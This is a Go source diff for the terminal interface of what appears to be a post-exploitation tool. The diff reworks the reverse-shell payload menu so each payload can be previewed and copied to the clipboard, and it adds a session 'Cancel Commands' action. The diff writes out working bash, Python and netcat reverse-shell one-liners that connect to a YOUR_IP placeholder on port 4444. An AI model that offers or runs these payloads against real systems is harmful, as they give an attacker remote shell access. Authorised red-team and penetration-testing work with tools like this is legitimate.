@@ -5,7 +5,9 @@ import (
 	"fmt"
 	"log"
 	"os"
+	"os/exec"
 	"regexp"
+	"runtime"
 	"strings"
 
 	"github.com/Aryma-f4/necromancy/core"
@@ -67,6 +69,74 @@ type App struct {
 	pages    *tview.Pages
 	sessions *core.SessionManager
 	menuList *tview.List
+}
+
+type payloadDefinition struct {
+	Name        string
+	Description string
+	Command     string
+}
+
+func payloadDefinitions() []payloadDefinition {
+	return []payloadDefinition{
+		{
+			Name:        "Bash",
+			Description: "Classic bash TCP reverse shell",
+			Command:     "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1",
+		},
+		{
+			Name:        "Python",
+			Description: "Python PTY reverse shell",
+			Command:     `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'`,
+		},
+		{
+			Name:        "Netcat",
+			Description: "FIFO-based netcat reverse shell",
+			Command:     "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 4444 >/tmp/f",
+		},
+	}
+}
+
+func copyTextToClipboard(text string) error {
+	type candidate struct {
+		name string
+		args []string
+	}
+
+	candidates := []candidate{}
+	switch runtime.GOOS {
+	case "darwin":
+		candidates = append(candidates, candidate{name: "pbcopy"})
+	case "windows":
+		candidates = append(candidates, candidate{name: "clip"})
+	default:
+		candidates = append(candidates,
+			candidate{name: "wl-copy"},
+			candidate{name: "xclip", args: []string{"-selection", "clipboard"}},
+			candidate{name: "xsel", args: []string{"--clipboard", "--input"}},
+		)
+	}
+
+	var lastErr error
+	for _, candidate := range candidates {
+		path, err := exec.LookPath(candidate.name)
+		if err != nil {
+			lastErr = err
+			continue
+		}
+		cmd := exec.Command(path, candidate.args...)
+		cmd.Stdin = strings.NewReader(text)
+		if err := cmd.Run(); err == nil {
+			return nil
+		} else {
+			lastErr = err
+		}
+	}
+
+	if lastErr != nil {
+		return fmt.Errorf("clipboard tool not available: %w", lastErr)
+	}
+	return fmt.Errorf("clipboard tool not available")
 }
 
 func (a *App) mainMenuSummary() string {
@@ -254,6 +324,17 @@ func (a *App) showSessionActions(id int) {
 		AddItem("Interact", "Connect to the shell", 'i', func() {
 			a.openSessionTerminal(id)
 		}).
+		AddItem("Cancel Commands", "Send interrupt and stop running session commands", 'c', func() {
+			session, exists := a.sessions.Get(id)
+			if !exists {
+				a.showSessionsList()
+				return
+			}
+			if err := session.CancelRunningCommands(); err != nil {
+				log.Printf("Cancel commands error: %v", err)
+			}
+			a.showSessionActions(id)
+		}).
 		AddItem("Run Module", "Run a post-exploitation module", 'm', func() {
 			a.showModulesList(id)
 		}).
@@ -391,8 +472,10 @@ func (a *App) showModulesList(id int) {
 			err := mm.RunModule(modName, session)
 			if err != nil {
 				log.Printf("Module error: %v", err)
+				a.showSessionActions(id)
+				return
 			}
-			a.showSessionActions(id)
+			a.openSessionTerminal(id)
 		})
 	}
 
@@ -452,30 +535,73 @@ func (a *App) showInterfaces() {
 	a.pages.AddPage("interfaces", wrapWithBanner(tv, true), true, true)
 }
 func (a *App) showPayloads() {
-	tv := tview.NewTextView().SetDynamicColors(true)
-	tv.SetBorder(true).SetTitle(" Reverse Shell Payloads (Esc to go back) ")
+	payloads := payloadDefinitions()
 
-	payloads := `[green]Available Reverse Shell Payloads:[white]
+	list := tview.NewList()
+	list.SetBorder(true).SetTitle(" Payload Types ")
+	list.SetBackgroundColor(tcell.ColorBlack)
+	list.SetHighlightFullLine(true)
 
-[yellow]Bash:[white]
-bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
+	preview := tview.NewTextView().
+		SetDynamicColors(true).
+		SetWrap(true)
+	preview.SetBorder(true).SetTitle(" Payload Preview ")
+	preview.SetBackgroundColor(tcell.ColorBlack)
 
-[yellow]Python:[white]
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
+	status := tview.NewTextView().
+		SetDynamicColors(true).
+		SetTextAlign(tview.AlignCenter)
+	status.SetBackgroundColor(tcell.ColorBlack)
+	status.SetText("[gray]Enter to inspect | c to copy selected payload | Esc to go back[-]")
 
-[yellow]Netcat:[white]
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 4444 >/tmp/f
-`
-	tv.SetText(payloads)
-	tv.SetInputCapture(func(event *tcell.EventKey) *tcell.EventKey {
+	updatePreview := func(index int) {
+		if index < 0 || index >= len(payloads) {
+			return
+		}
+		item := payloads[index]
+		preview.SetText(fmt.Sprintf("[yellow]%s[white]\n[green]%s[white]\n\n%s", item.Name, item.Description, item.Command))
+	}
+
+	for i, payload := range payloads {
+		idx := i
+		list.AddItem(payload.Name, payload.Description, 0, func() {
+			updatePreview(idx)
+		})
+	}
+
+	list.SetChangedFunc(func(index int, mainText string, secondaryText string, shortcut rune) {
+		updatePreview(index)
+	})
+
+	updatePreview(0)
+
+	root := tview.NewFlex().
+		AddItem(list, 0, 2, true).
+		AddItem(preview, 0, 3, false)
+	layout := tview.NewFlex().SetDirection(tview.FlexRow).
+		AddItem(root, 0, 1, true).
+		AddItem(status, 1, 0, false)
+
+	layout.SetInputCapture(func(event *tcell.EventKey) *tcell.EventKey {
 		if event.Key() == tcell.KeyEscape {
 			a.pages.SwitchToPage("menu")
 			return nil
 		}
+		if event.Key() == tcell.KeyRune && (event.Rune() == 'c' || event.Rune() == 'C') {
+			index := list.GetCurrentItem()
+			if index >= 0 && index < len(payloads) {
+				if err := copyTextToClipboard(payloads[index].Command); err != nil {
+					status.SetText(fmt.Sprintf("[red]Copy failed:[white] %v", err))
+				} else {
+					status.SetText(fmt.Sprintf("[green]Copied:[white] %s", payloads[index].Name))
+				}
+			}
+			return nil
+		}
 		return event
 	})
-	tv.SetBackgroundColor(tcell.ColorBlack)
-	a.pages.AddPage("payloads", wrapWithBanner(tv, true), true, true)
+
+	a.pages.AddPage("payloads", wrapWithBanner(layout, true), true, true)
 }
 
 func (a *App) showAllModules() {
